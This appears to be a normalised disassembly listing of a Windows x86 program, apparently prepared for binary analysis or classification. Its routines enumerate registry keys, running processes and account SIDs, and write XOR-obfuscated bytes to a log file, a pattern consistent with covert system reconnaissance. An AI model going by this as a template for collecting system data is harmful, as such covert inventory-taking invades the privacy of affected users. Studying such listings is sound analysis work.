mov [ rw-data ] dl
mov edx [ r--data ]
mov [ rw-data ] edx
mov edx [ r--data ]
mov [ rw-data ] edx
movzx edx [ r--data ]
mov [ rw-data ] dx
movzx edx [ r--data ]
mov [ rw-data ] dl
mov edx [ r--data ]
mov [ rw-data ] edx
mov edx [ r--data ]
mov [ rw-data ] ecx
mov ecx [ r--data ]
mov [ rw-data ] edx
movzx edx [ r--data ]
mov [ rw-data ] ecx
mov ecx 0x44
mov [ rw-data ] ecx
mov [ rw-data ] ecx
mov ecx [ r--data ]
mov [ rw-data ] dx
movzx edx [ r--data ]
mov [ rw-data ] ecx
mov ecx [ r--data ]
mov eax 0x43
mov [ rw-data ] dl
mov edx [ r--data ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov eax [ r--data ]
mov esi 0x45
mov [ rw-data ] ecx
mov ecx [ r--data ]
mov [ rw-data ] edx
mov edx [ r--data ]
mov [ rw-data ] eax
mov [ rw-data ] esi
mov [ rw-data ] ecx
mov [ rw-data ] esi
mov eax 0x57
mov ecx 0x47
mov esi 0x53
mov [ rw-data ] edx
movzx edx [ r--data ]
mov [ rw-data ] 0xc3
mov [ rw-data ] 0xc4
mov [ rw-data ] eax
mov [ rw-data ] 0xd7
mov [ rw-data ] 0x58
mov [ rw-data ] 0xd8
mov [ rw-data ] 0x46
mov [ rw-data ] 0xc6
mov [ rw-data ] ecx
mov [ rw-data ] 0xc5
mov [ rw-data ] esi
mov [ rw-data ] ebp
mov [ rw-data ] 0xb7
mov [ rw-data ] 0x55
mov [ rw-data ] 0x4a
mov [ rw-data ] 0xca
mov [ rw-data ] 0x56
mov [ rw-data ] dx
movzx edx [ r--data ]
mov [ rw-data ] dl
mov edx [ r--data ]
mov [ rw-data ] edx
movzx edx [ r--data ]
mov [ rw-data ] dl
mov edx [ r--data ]
mov [ rw-data ] edx
mov edx [ r--data ]
mov [ rw-data ] edx
movzx edx [ r--data ]
mov [ rw-data ] dx
movzx edx [ r--data ]
mov [ rw-data ] dl
mov edx [ r--data ]
mov [ rw-data ] edx
mov edx [ r--data ]
mov [ rw-data ] edx
movzx edx [ r--data ]
mov [ rw-data ] dx
movzx edx [ r--data ]
mov [ rw-data ] dl
mov edx [ r--data ]
mov [ rw-data ] edx
mov edx [ r--data ]
mov [ rw-data ] edx
movzx edx [ r--data ]
mov [ rw-data ] dx
movzx edx [ r--data ]
mov [ rw-data ] dl
mov edx [ r--data ]
mov [ rw-data ] edx
mov edx [ r--data ]
mov [ rw-data ] edx
movzx edx [ r--data ]
mov [ rw-data ] dx
movzx edx [ r--data ]
mov [ rw-data ] dl
mov edx [ r--data ]
mov [ rw-data ] edx
mov edx [ r--data ]
mov [ rw-data ] edx
movzx edx [ r--data ]
mov [ rw-data ] dx
movzx edx [ r--data ]
mov [ rw-data ] dl
mov edx [ r--data ]
mov [ rw-data ] edx
mov edx [ r--data ]
mov [ rw-data ] eax
mov eax [ r--data ]
mov [ rw-data ] edx
movzx edx [ r--data ]
mov [ rw-data ] eax
movzx eax [ r--data ]
mov [ rw-data ] dx
movzx edx [ r--data ]
mov [ rw-data ] ax
mov eax 0x59
mov [ rw-data ] 0x4e
mov [ rw-data ] 0xce
mov [ rw-data ] 0x4f
mov [ rw-data ] 0xcf
mov [ rw-data ] eax
mov [ rw-data ] 0x50
mov [ rw-data ] 0xd0
mov [ rw-data ] 0x5a
mov [ rw-data ] 0x51
mov [ rw-data ] 0xd1
mov [ rw-data ] 0x5b
mov [ rw-data ] 0x4b
mov [ rw-data ] 0xcb
mov [ rw-data ] 0x5c
mov [ rw-data ] 0x4c
mov [ rw-data ] 0xcc
mov [ rw-data ] 0x5d
mov [ rw-data ] 0x4d
mov [ rw-data ] 0xcd
mov [ rw-data ] 0x5e
mov [ rw-data ] dl
mov edx [ r--data ]
mov [ rw-data ] ecx
mov ecx [ r--data ]
mov [ rw-data ] edx
movzx edx [ r--data ]
mov [ rw-data ] ecx
movzx ecx [ r--data ]
mov [ rw-data ] dl
mov edx [ r--data ]
mov [ rw-data ] cx
mov ecx [ r--data ]
mov [ rw-data ] edx
movzx edx [ r--data ]
mov [ rw-data ] ecx
movzx ecx [ r--data ]
mov [ rw-data ] dl
mov edx [ r--data ]
mov [ rw-data ] cx
mov ecx [ r--data ]
mov [ rw-data ] edx
movzx edx [ r--data ]
mov [ rw-data ] ecx
movzx ecx [ r--data ]
mov [ rw-data ] dl
mov edx [ r--data ]
mov [ rw-data ] cx
mov ecx [ r--data ]
mov [ rw-data ] edx
movzx edx [ r--data ]
mov [ rw-data ] ecx
movzx ecx [ r--data ]
mov [ rw-data ] dl
mov edx [ r--data ]
mov [ rw-data ] cx
mov ecx [ r--data ]
mov [ rw-data ] edx
movzx edx [ r--data ]
mov [ rw-data ] ecx
movzx ecx [ r--data ]
mov [ rw-data ] dl
movzx edx [ r--data ]
mov [ rw-data ] cx
mov ecx [ r--data ]
mov [ rw-data ] eax
mov eax [ r--data ]
mov [ rw-data ] eax
mov eax [ r--data ]
mov [ rw-data ] ecx
mov ecx [ r--data ]
mov [ rw-data ] dl
movzx edx [ r--data ]
mov [ rw-data ] eax
mov eax [ r--data ]
mov [ rw-data ] ecx
mov ecx [ r--data ]
mov [ rw-data ] dx
mov edx [ r--data ]
mov [ rw-data ] 0xc7
mov [ rw-data ] 0x5f
mov [ rw-data ] 0x48
mov [ rw-data ] 0xc8
mov [ rw-data ] 0x60
mov [ rw-data ] 0x49
mov [ rw-data ] 0xc9
mov [ rw-data ] 0x61
mov [ rw-data ] 0x52
mov [ rw-data ] 0xd2
mov [ rw-data ] 0x62
mov [ rw-data ] esi
mov [ rw-data ] 0xd3
mov [ rw-data ] 0x63
mov [ rw-data ] 0xd9
mov [ rw-data ] 0x67
mov [ rw-data ] 0x1d
mov [ rw-data ] 0x9d
mov [ rw-data ] 0x2a
mov [ rw-data ] 0xaa
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edi
mov [ rw-data ] 0xb8
mov eax [ r--data ]
movzx ecx [ r--data ]
pop edi
pop esi
pop ebp
mov [ rw-data ] eax
mov [ rw-data ] ebx
mov [ rw-data ] edx
mov [ rw-data ] cx
mov [ rw-data ] 0xb6
mov eax 0x55
pop ebx
retn
sub_402fd0
push ebx
push esi
push 0x1900
push 0x0
push rw-data
call sub_4109d0
mov edx [ r--data ]
mov ecx [ r--data ]
mov eax [ r--data ]
mov [ rw-data ] edx
mov edx [ r--data ]
mov [ rw-data ] ecx
movzx ecx [ r--data ]
mov [ rw-data ] edx
movzx edx [ r--data ]
mov [ rw-data ] eax
movzx eax [ r--data ]
mov [ rw-data ] cl
mov ecx [ r--data ]
mov [ rw-data ] dx
mov edx [ r--data ]
mov [ rw-data ] ax
mov eax [ r--data ]
mov [ rw-data ] ecx
mov ecx [ r--data ]
mov [ rw-data ] edx
mov edx [ r--data ]
mov [ rw-data ] eax
movzx eax [ r--data ]
mov [ rw-data ] ecx
movzx ecx [ r--data ]
mov [ rw-data ] edx
movzx edx [ r--data ]
mov [ rw-data ] al
mov eax [ r--data ]
mov [ rw-data ] cx
mov ecx [ r--data ]
mov [ rw-data ] dx
mov edx [ r--data ]
mov [ rw-data ] eax
mov eax [ r--data ]
mov [ rw-data ] ecx
mov ecx [ r--data ]
mov [ rw-data ] edx
mov edx [ r--data ]
mov [ rw-data ] eax
movzx eax [ r--data ]
mov [ rw-data ] ecx
mov ecx [ r--data ]
mov [ rw-data ] edx
movzx edx [ r--data ]
mov [ rw-data ] al
mov eax 0x46
mov [ rw-data ] ecx
mov ecx [ r--data ]
mov [ rw-data ] dl
movzx edx [ r--data ]
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov ecx [ r--data ]
mov [ rw-data ] eax
mov eax [ r--data ]
mov ebx 0x48
add esp 0xc
mov [ rw-data ] 0x5e
mov [ rw-data ] 0xde
mov [ rw-data ] 0x81
mov [ rw-data ] 0x5f
mov [ rw-data ] 0xdf
mov [ rw-data ] 0x82
mov [ rw-data ] 0x63
mov [ rw-data ] 0xe3
mov [ rw-data ] 0x83
mov [ rw-data ] 0x37
mov [ rw-data ] 0xb7
mov [ rw-data ] 0xc6
mov [ rw-data ] ebx
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] dl
mov [ rw-data ] 0x52
mov ecx [ r--data ]
movzx edx [ r--data ]
mov [ rw-data ] ecx
movzx ecx [ r--data ]
mov [ rw-data ] dx
mov edx [ r--data ]
mov [ rw-data ] cl
mov ecx [ r--data ]
mov [ rw-data ] edx
movzx edx [ r--data ]
mov [ rw-data ] ecx
mov ecx [ r--data ]
mov [ rw-data ] ecx
movzx ecx [ r--data ]
mov [ rw-data ] dx
movzx edx [ r--data ]
mov eax 0x49
mov [ rw-data ] eax
mov [ rw-data ] eax
mov eax [ r--data ]
mov [ rw-data ] eax
mov eax [ r--data ]
mov [ rw-data ] cx
mov ecx [ r--data ]
mov [ rw-data ] dl
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov ecx [ r--data ]
mov edx 0x4f
mov [ rw-data ] edx
mov [ rw-data ] edx
mov edx [ r--data ]
mov eax 0x4d
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov ecx [ r--data ]
mov [ rw-data ] eax
movzx eax [ r--data ]
mov [ rw-data ] edx
mov edx [ r--data ]
mov [ rw-data ] ecx
mov ecx [ r--data ]
mov [ rw-data ] al
mov [ rw-data ] edx
movzx edx [ r--data ]
mov eax 0x50
mov [ rw-data ] ecx
movzx ecx [ r--data ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov eax [ r--data ]
mov [ rw-data ] dl
movzx edx [ r--data ]
mov esi 0x51
mov [ rw-data ] cl
mov [ rw-data ] eax
mov eax [ r--data ]
mov ecx 0xcd
mov [ rw-data ] 0xd2
mov [ rw-data ] 0x47
mov [ rw-data ] 0xc7
mov [ rw-data ] 0x4a
mov [ rw-data ] 0xc9
mov [ rw-data ] 0x4b
mov [ rw-data ] 0x53
mov [ rw-data ] 0xd3
mov [ rw-data ] 0x4c
mov [ rw-data ] 0xcf
mov [ rw-data ] esi
mov [ rw-data ] 0xd1
mov [ rw-data ] 0x4e
mov [ rw-data ] ecx
mov [ rw-data ] 0x4b
mov [ rw-data ] 0xcb
mov [ rw-data ] 0xd0
mov [ rw-data ] esi
mov [ rw-data ] dl
mov [ rw-data ] ebx
mov [ rw-data ] 0xc8
mov [ rw-data ] 0x52
mov [ rw-data ] eax
mov edx [ r--data ]
mov [ rw-data ] edx
movzx edx [ r--data ]
mov [ rw-data ] dl
mov edx [ r--data ]
mov [ rw-data ] edx
mov edx [ r--data ]
mov [ rw-data ] edx
mov edx [ r--data ]
mov [ rw-data ] edx
movzx edx [ r--data ]
mov [ rw-data ] dx
movzx edx [ r--data ]
mov [ rw-data ] dl
mov edx [ r--data ]
mov [ rw-data ] edx
movzx edx [ r--data ]
mov [ rw-data ] dx
mov edx [ r--data ]
mov [ rw-data ] edx
mov edx [ r--data ]
mov esi [ r--data ]
mov [ rw-data ] edx
mov edx [ r--data ]
mov [ rw-data ] edx
mov edx [ r--data ]
movzx eax [ r--data ]
mov [ rw-data ] edx
movzx edx [ r--data ]
mov [ rw-data ] dl
mov edx [ r--data ]
mov [ rw-data ] edx
mov edx [ r--data ]
mov [ rw-data ] edx
mov edx [ r--data ]
mov [ rw-data ] edx
mov edx [ r--data ]
mov [ rw-data ] edx
movzx edx [ r--data ]
mov [ rw-data ] esi
mov esi [ r--data ]
mov [ rw-data ] esi
mov esi [ r--data ]
mov [ rw-data ] dl
mov edx [ r--data ]
mov [ rw-data ] esi
mov esi [ r--data ]
mov [ rw-data ] edx
mov edx [ r--data ]
mov [ rw-data ] esi
mov esi [ r--data ]
mov [ rw-data ] ax
mov [ rw-data ] edx
mov eax 0xb5
mov edx 0xe6
mov [ rw-data ] esi
mov esi [ r--data ]
mov [ rw-data ] 0x35
mov [ rw-data ] eax
mov [ rw-data ] 0x54
mov [ rw-data ] 0x1c
mov [ rw-data ] 0x9c
mov [ rw-data ] 0x58
mov [ rw-data ] 0x5d
mov [ rw-data ] 0xdd
mov [ rw-data ] 0x65
mov [ rw-data ] 0x5e
mov [ rw-data ] 0xde
mov [ rw-data ] 0x66
mov [ rw-data ] 0x5b
mov [ rw-data ] 0xdb
mov [ rw-data ] 0xe3
mov [ rw-data ] 0x1d
mov [ rw-data ] 0x9d
mov [ rw-data ] 0xe4
mov [ rw-data ] 0x38
mov [ rw-data ] 0xb8
mov [ rw-data ] edx
mov [ rw-data ] 0x5c
mov [ rw-data ] 0xdc
mov [ rw-data ] 0xe7
mov [ rw-data ] eax
mov eax [ r--data ]
mov [ rw-data ] eax
mov eax [ r--data ]
mov [ rw-data ] eax
mov eax [ r--data ]
mov [ rw-data ] eax
mov eax [ r--data ]
mov [ rw-data ] eax
mov eax [ r--data ]
mov [ rw-data ] eax
movzx eax [ r--data ]
mov [ rw-data ] ax
mov eax [ r--data ]
mov [ rw-data ] eax
movzx eax [ r--data ]
mov [ rw-data ] ax
movzx eax [ r--data ]
mov [ rw-data ] al
mov eax [ r--data ]
mov [ rw-data ] eax
mov eax [ r--data ]
mov [ rw-data ] eax
mov eax [ r--data ]
mov [ rw-data ] eax
movzx eax [ r--data ]
mov [ rw-data ] ax
movzx eax [ r--data ]
mov [ rw-data ] ax
mov eax [ r--data ]
mov [ rw-data ] eax
mov eax [ r--data ]
mov [ rw-data ] eax
mov eax [ r--data ]
mov [ rw-data ] ecx
mov ecx [ r--data ]
mov [ rw-data ] eax
movzx eax [ r--data ]
mov [ rw-data ] ecx
movzx ecx [ r--data ]
mov [ rw-data ] ax
mov eax [ r--data ]
mov [ rw-data ] cl
mov ecx [ r--data ]
mov [ rw-data ] eax
mov eax [ r--data ]
mov [ rw-data ] ecx
mov ecx [ r--data ]
mov [ rw-data ] eax
mov eax [ r--data ]
mov [ rw-data ] esi
mov si [ r--data ]
mov [ rw-data ] ecx
mov ecx [ r--data ]
mov [ rw-data ] eax
movzx eax [ r--data ]
mov [ rw-data ] si
mov [ rw-data ] ecx
mov esi 0xe9
mov ecx 0xea
mov [ rw-data ] ax
movzx eax [ r--data ]
mov [ rw-data ] 0x19
mov [ rw-data ] 0x99
mov [ rw-data ] 0x10
mov [ rw-data ] 0x90
mov [ rw-data ] 0xb6
mov [ rw-data ] 0x24
mov [ rw-data ] 0xa4
mov [ rw-data ] 0xb7
mov [ rw-data ] 0x22
mov [ rw-data ] 0xa2
mov [ rw-data ] 0x20
mov [ rw-data ] 0xa0
mov [ rw-data ] 0xe2
mov [ rw-data ] 0x30
mov [ rw-data ] 0xb0
mov [ rw-data ] esi
mov [ rw-data ] 0x2e
mov [ rw-data ] 0xae
mov [ rw-data ] ecx
mov [ rw-data ] al
mov eax [ r--data ]
mov [ rw-data ] eax
movzx eax [ r--data ]
mov [ rw-data ] ax
movzx eax [ r--data ]
mov [ rw-data ] al
mov eax [ r--data ]
mov [ rw-data ] eax
mov eax [ r--data ]
mov [ rw-data ] eax
mov eax [ r--data ]
mov [ rw-data ] eax
movzx eax [ r--data ]
mov ebx [ r--data ]
mov [ rw-data ] al
mov eax 0x21
mov [ rw-data ] eax
mov [ rw-data ] eax
mov eax [ r--data ]
mov [ rw-data ] eax
mov eax [ r--data ]
mov [ rw-data ] eax
movzx eax [ r--data ]
mov [ rw-data ] ax
movzx eax [ r--data ]
mov [ rw-data ] al
mov eax [ r--data ]
mov [ rw-data ] ebx
mov ebx [ r--data ]
mov [ rw-data ] eax
mov eax [ r--data ]
mov [ rw-data ] ebx
mov ebx [ r--data ]
mov [ rw-data ] eax
movzx eax [ r--data ]
mov [ rw-data ] ebx
mov bx [ r--data ]
mov [ rw-data ] bx
mov ebx [ r--data ]
mov [ rw-data ] ax
movzx eax [ r--data ]
mov [ rw-data ] ebx
mov ebx [ r--data ]
mov [ rw-data ] al
mov eax [ r--data ]
mov [ rw-data ] ecx
mov ecx [ r--data ]
mov [ rw-data ] ebx
mov ebx [ r--data ]
mov [ rw-data ] ecx
mov ecx [ r--data ]
mov [ rw-data ] eax
movzx eax [ r--data ]
mov [ rw-data ] ebx
mov bl [ r--data ]
mov [ rw-data ] ecx
mov ecx [ r--data ]
mov [ rw-data ] 0x6d
mov [ rw-data ] 0xed
mov [ rw-data ] 0x83
mov [ rw-data ] 0x6c
mov [ rw-data ] 0xec
mov [ rw-data ] 0x8a
mov [ rw-data ] 0xa1
mov [ rw-data ] 0x92
mov [ rw-data ] 0x6b
mov [ rw-data ] 0xeb
mov [ rw-data ] 0x94
mov [ rw-data ] bl
mov [ rw-data ] 0x65
mov [ rw-data ] 0xe5
mov [ rw-data ] 0x32
mov [ rw-data ] 0xb2
mov [ rw-data ] 0x23
mov [ rw-data ] 0x6a
mov [ rw-data ] 0x24
mov [ rw-data ] ax
mov [ rw-data ] 0x69
mov [ rw-data ] esi
mov [ rw-data ] 0x25
mov eax [ r--data ]
mov [ rw-data ] eax
movzx eax [ r--data ]
mov [ rw-data ] ecx
movzx ecx [ r--data ]
mov [ rw-data ] al
mov eax [ r--data ]
mov [ rw-data ] cx
mov ecx [ r--data ]
mov [ rw-data ] eax
movzx eax [ r--data ]
mov [ rw-data ] ecx
mov ecx [ r--data ]
mov [ rw-data ] ax
mov eax [ r--data ]
mov [ rw-data ] ecx
mov ecx [ r--data ]
mov [ rw-data ] eax
mov eax [ r--data ]
mov [ rw-data ] ecx
mov ecx [ r--data ]
pop esi
mov [ rw-data ] eax
mov [ rw-data ] 0x68
mov [ rw-data ] 0xe8
mov [ rw-data ] 0x26
mov [ rw-data ] 0x67
mov [ rw-data ] 0xe7
mov [ rw-data ] 0x27
mov [ rw-data ] ecx
mov [ rw-data ] 0x66
mov [ rw-data ] edx
mov [ rw-data ] 0x2a
mov eax 0x28
pop ebx
retn
sub_403b60
sub esp 0xf1c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xf14 ] eax
push ebx
push ebp
push esi
push edi
mov ecx r--data
lea edx [ esp + 0x220 ]
xor ebx ebx
call sub_4010b0
mov ebp [ RegOpenKeyExA@IAT ]
lea eax [ esp + 0x1c ]
push eax
push 0x8
push ebx
lea ecx [ esp + 0x22c ]
push ecx
push 0x80000002
call ebp
test eax eax
jne r-xdata
mov ecx [ esp + 0xf24 ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_40f589
add esp 0xf1c
retn
mov ecx [ esp + 0x1c ]
lea edx [ esp + 0x14 ]
push edx
lea eax [ esp + 0x24 ]
push eax
push ebx
mov edi 0x200
push ecx
mov [ esp + 0x24 ] edi
call [ SHEnumKeyExA@IAT ]
test eax eax
jne r-xdata
mov esi [ RegQueryValueExA@IAT ]
lea ecx [ ecx ]
mov edx [ esp + 0x1c ]
lea eax [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x24 ]
push ecx
add ebx 0x1
push ebx
push edx
mov [ esp + 0x24 ] edi
call [ SHEnumKeyExA@IAT ]
test eax eax
je r-xdata
lea ecx [ esp + 0x14 ]
push ecx
lea edx [ esp + 0x324 ]
push edx
push eax
push eax
mov eax [ esp + 0x28 ]
push r--data
push eax
mov [ esp + 0x2c ] edi
call esi
test eax eax
jne r-xdata
lea edx [ esp + 0x20 ]
push edx
lea eax [ esp + 0x224 ]
push eax
lea ecx [ esp + 0xb28 ]
push r--data
push ecx
call sub_40f598
add esp 0x10
lea edx [ esp + 0x18 ]
push edx
push 0x20019
push 0x0
lea eax [ esp + 0xb2c ]
push eax
push 0x80000002
call ebp
test eax eax
jne r-xdata
mov edx [ esp + 0x18 ]
push edx
call [ RegCloseKey@IAT ]
lea ecx [ esp + 0x14 ]
push ecx
lea edx [ esp + 0x724 ]
push edx
push eax
push eax
mov eax [ esp + 0x28 ]
push r--data
push eax
mov [ esp + 0x2c ] edi
call esi
test eax eax
jne r-xdata
lea ecx [ esp + 0x320 ]
push ecx
lea edx [ esp + 0x24 ]
push edx
lea eax [ esp + 0x528 ]
push r--data
push eax
call sub_40f598
add esp 0x10
lea ecx [ esp + 0x14 ]
push ecx
lea edx [ esp + 0x924 ]
push edx
push eax
push eax
mov eax [ esp + 0x28 ]
push r--data
push eax
mov [ esp + 0x2c ] edi
call esi
test eax eax
jne r-xdata
lea eax [ esp + 0x720 ]
push eax
lea ecx [ esp + 0x324 ]
push ecx
lea edx [ esp + 0x28 ]
push edx
lea eax [ esp + 0x52c ]
push r--data
push eax
call sub_40f598
add esp 0x14
jmp r-xdata
lea ecx [ esp + 0x14 ]
push ecx
lea edx [ esp + 0xd24 ]
push edx
push eax
push eax
mov eax [ esp + 0x28 ]
push r--data
push eax
mov [ esp + 0x2c ] edi
call esi
test eax eax
jne r-xdata
push 0x0
lea ecx [ esp + 0x524 ]
push 0x0
push ecx
call sub_4041d0
add esp 0xc
lea ecx [ esp + 0x920 ]
push ecx
lea edx [ esp + 0x724 ]
push edx
lea eax [ esp + 0x328 ]
push eax
lea ecx [ esp + 0x2c ]
push ecx
lea edx [ esp + 0x530 ]
push r--data
push edx
call sub_40f598
add esp 0x18
jmp r-xdata
lea ecx [ esp + 0xd20 ]
push ecx
lea edx [ esp + 0x924 ]
push edx
lea eax [ esp + 0x728 ]
push eax
lea ecx [ esp + 0x32c ]
push ecx
lea edx [ esp + 0x30 ]
push edx
lea eax [ esp + 0x534 ]
push r--data
push eax
call sub_40f598
add esp 0x1c
jmp r-xdata
sub_403de0
sub esp 0xc
push ebp
mov ebp [ LookupAccountSidA@IAT ]
push esi
lea eax [ esp + 0x10 ]
push eax
xor esi esi
lea ecx [ esp + 0xc ]
push ecx
push esi
lea edx [ esp + 0x18 ]
push edx
push esi
push ebx
push esi
mov [ esp + 0x24 ] esi
mov [ esp + 0x28 ] esi
call ebp
test eax eax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
push 0x534
call [ SetLastError@IAT ]
pop esi
xor eax eax
pop ebp
add esp 0xc
retn
mov eax [ esp + 0xc ]
push edi
push eax
push esi
mov esi [ LocalAlloc@IAT ]
call esi
mov edi eax
test edi edi
je r-xdata
pop edi
pop esi
xor eax eax
pop ebp
add esp 0xc
retn
mov ecx [ esp + 0xc ]
push ecx
push 0x0
call esi
mov esi eax
test esi esi
jne r-xdata
lea edx [ esp + 0x14 ]
push edx
lea eax [ esp + 0x10 ]
push eax
push esi
lea ecx [ esp + 0x1c ]
push ecx
push edi
push ebx
push 0x0
call ebp
test eax eax
push esi
jne r-xdata
push edi
call [ LocalFree@IAT ]
pop edi
pop esi
xor eax eax
pop ebp
add esp 0xc
retn
call [ LocalFree@IAT ]
mov eax edi
pop edi
pop esi
pop ebp
add esp 0xc
retn
mov esi [ LocalFree@IAT ]
call esi
push edi
call esi
sub_403ea0
sub esp 0x344
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x33c ] eax
push ebx
push ebp
push esi
push edi
push 0x0
push 0x2
call CreateToolhelp32Snapshot
mov ebx eax
cmp ebx 0xffffffff
mov [ esp + 0x18 ] ebx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ esp + 0x20 ]
push eax
push ebx
mov [ esp + 0x28 ] 0x128
call Process32First
test eax eax
jne r-xdata
mov ecx [ esp + 0x34c ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_40f589
add esp 0x344
retn
mov edi [ esp + 0x18 ]
push ebx
call [ CloseHandle@IAT ]
mov ecx [ esp + 0x28 ]
push ecx
lea edx [ esp + 0x48 ]
push edx
lea eax [ esp + 0x150 ]
push r--data
push eax
call sub_40f598
add esp 0x10
push 0xff
lea edx [ esp + 0x24c ]
push edx
push 0x0
push ebp
call GetModuleFileNameExA
lea eax [ esp + 0x1c ]
push eax
push 0x8
push ebp
call [ OpenProcessToken@IAT ]
cmp eax 0x1
jne r-xdata
mov ecx [ esp + 0x28 ]
push ecx
push 0x0
push 0x1f0fff
call [ OpenProcess@IAT ]
mov ebp eax
test ebp ebp
je r-xdata
push ebx
call [ CloseHandle@IAT ]
mov eax 0x1
push ebp
call [ CloseHandle@IAT ]
jmp r-xdata
mov edx [ esp + 0x1c ]
mov esi [ GetTokenInformation@IAT ]
lea ecx [ esp + 0x14 ]
push ecx
push 0x0
push edi
push eax
push edx
call esi
cmp eax 0x1
je r-xdata
push 0x0
lea ecx [ esp + 0x14c ]
push 0x0
push ecx
call sub_4041d0
add esp 0xc
lea edx [ esp + 0x20 ]
push edx
push ebx
call Process32Next
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
mov eax [ esp + 0x14 ]
push eax
push 0x0
call [ LocalAlloc@IAT ]
mov edx [ esp + 0x14 ]
lea ecx [ esp + 0x14 ]
push ecx
push edx
mov edi eax
mov eax [ esp + 0x24 ]
push edi
push 0x1
push eax
call esi
mov ebx [ edi ]
call sub_403de0
mov ecx [ esp + 0x28 ]
mov esi eax
push esi
push ecx
lea edx [ esp + 0x250 ]
push edx
lea eax [ esp + 0x154 ]
push r--data
push eax
call sub_40f598
add esp 0x14
push esi
call [ LocalFree@IAT ]
mov ebx [ esp + 0x18 ]
sub_404040
sub esp 0xa0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x9c ] eax
push esi
push edi
mov edi [ GetVersionExA@IAT ]
lea eax [ esp + 0x8 ]
push eax
xor esi esi
mov [ esp + 0xc ] 0x9c
call edi
test eax eax
jne r-xdata
mov eax [ esp + 0x18 ]
sub eax 0x2
jne r-xdata
lea ecx [ esp + 0x8 ]
push ecx
mov [ esp + 0xc ] 0x94
call edi
test eax eax
jne r-xdata
xor esi esi
jmp r-xdata
mov eax [ esp + 0xc ]
cmp eax 0x4
jbe r-xdata
pop edi
pop esi
mov ecx [ esp + 0x9c ]
xor ecx esp
call sub_40f589
add esp 0xa0
retn
mov ecx [ esp + 0xa4 ]
pop edi
mov eax esi
pop esi
xor ecx esp
call sub_40f589
add esp 0xa0
retn
cmp eax 0x5
jne r-xdata
cmp eax 0x6
jne r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov esi 0x1
cmp eax 0x1
jne r-xdata
sub_4040f0
push ecx
mov eax [ esp + 0x8 ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
add eax 0x1
test cl cl
jne r-xdata
push esi
sub eax edx
push edi
mov edi eax
xor esi esi
test edi edi
jle r-xdata
pop edi
mov eax 0x1
pop esi
pop ecx
retn
push ebx
push ebp
mov ebp [ _lwrite@IAT ]
jmp r-xdata
mov eax [ esp + 0x18 ]
mov bl [ esi + eax ]
call sub_40fb56
cdq
mov ecx 0xff
idiv ecx
mov eax [ rw-data ]
push 0x1
xor dl bl
mov [ esp + 0x17 ] dl
lea edx [ esp + 0x17 ]
push edx
push eax
call ebp
add esi 0x1
cmp esi edi
jl r-xdata
pop ebp
pop ebx
sub_404160
push ecx
test esi esi
jne r-xdata
mov eax esi
lea edx [ eax + 0x1 ]
mov edi edi
xor eax eax
pop ecx
retn
mov cl [ eax ]
add eax 0x1
test cl cl
jne r-xdata
sub eax edx
je r-xdata
push esi
push edi
call [ lstrcpyA@IAT ]
mov eax esi
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
add eax 0x1
test cl cl
jne r-xdata
sub eax edx
add eax 0xffffffff
test eax eax
jle r-xdata
mov eax 0x1
pop ecx
retn
cmp [ eax + edi ] 0x5c
je r-xdata
mov [ eax + edi ] 0x0
sub eax 0x1
test eax eax
jg r-xdata
mov eax 0x1
pop ecx
retn
sub_4041d0
sub esp 0x618
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x614 ] eax
push ebx
mov ebx [ rw-data ]
push ebp
mov ebp [ esp + 0x624 ]
push esi
push edi
lea eax [ esp + 0x10 ]
push eax
call [ GetLocalTime@IAT ]
push 0x100
lea ecx [ esp + 0x524 ]
push ecx
push 0x0
call [ GetModuleFileNameA@IAT ]
lea edi [ esp + 0x420 ]
lea esi [ esp + 0x520 ]
call sub_404160
call [ GetTickCount@IAT ]
mov edx eax
sub edx [ rw-data ]
mov [ rw-data ] eax
cmp edx 0x36ee80
jbe r-xdata
test ebx ebx
je r-xdata
push ebx
mov [ rw-data ] eax
call [ _lclose@IAT ]
movzx eax [ esp + 0x1a ]
movzx ecx [ esp + 0x18 ]
movzx edx [ esp + 0x16 ]
push eax
movzx eax [ esp + 0x16 ]
push ecx
push edx
push eax
lea ecx [ esp + 0xfc ]
push r--data
push ecx
call [ wsprintfA@IAT ]
add esp 0x18
xor eax eax
jmp r-xdata
mov ecx [ esp + 0x624 ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_40f589
add esp 0x618
retn
mov eax 0x1
cmp [ esp + 0x634 ] eax
push ebp
jne r-xdata
mov cl [ esp + eax + 0x420 ]
mov [ esp + eax + 0x120 ] cl
add eax 0x1
test cl cl
jne r-xdata
cmp [ esp + 0x634 ] eax
jne r-xdata
movzx edx [ esp + 0x20 ]
movzx eax [ esp + 0x1e ]
movzx ecx [ esp + 0x1c ]
push edx
movzx edx [ esp + 0x1e ]
push eax
movzx eax [ esp + 0x1e ]
push ecx
push edx
push eax
lea ecx [ esp + 0x238 ]
push r--data
push ecx
call sub_40f598
lea edx [ esp + 0x240 ]
push edx
call sub_4040f0
add esp 0x24
jmp r-xdata
lea edi [ esp + 0x120 ]
add edi 0xffffffff
nop
lea edx [ esp + 0x224 ]
push r--data
push edx
call sub_40f598
lea eax [ esp + 0x22c ]
push eax
lea eax [ esp + 0x224 ]
push r--data
push eax
call sub_40f598
lea ecx [ esp + 0x22c ]
push ecx
jmp r-xdata
mov al [ edi + 0x1 ]
add edi 0x1
test al al
jne r-xdata
mov dx [ r--data ]
mov [ edi ] dx
mov ecx r--data
lea edx [ esp + 0xa8 ]
